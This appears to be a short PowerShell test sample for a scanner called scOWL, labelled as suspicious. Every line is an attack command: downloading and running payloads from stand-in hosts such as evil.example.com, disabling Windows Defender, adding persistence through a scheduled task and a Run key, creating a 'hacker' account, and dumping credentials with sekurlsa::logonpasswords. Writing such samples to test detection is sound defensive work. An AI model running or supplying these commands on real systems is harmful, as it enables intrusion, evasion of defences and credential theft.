# Suspicious PowerShell script - scOWL test sample
$url = "http://evil.example.com/payload.exe"
$encoded = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8"
powershell.exe -EncodedCommand $encoded
$client = New-Object Net.WebClient
$client.DownloadFile("http://192.168.1.100/malware.exe", "C:\Windows\Temp\svc.exe")
IEX (New-Object Net.WebClient).DownloadString("http://10.0.0.1/stager.ps1")
Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
Set-ExecutionPolicy Bypass -Scope Process -Force
$bytes = [System.Convert]::FromBase64String($encoded)
[System.Reflection.Assembly]::Load($bytes)
schtasks /create /tn "WindowsUpdate" /tr "C:\Temp\svc.exe" /sc onlogon
net user hacker P@ssw0rd /add
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v svc /t REG_SZ /d "C:\Temp\svc.exe"
sekurlsa::logonpasswords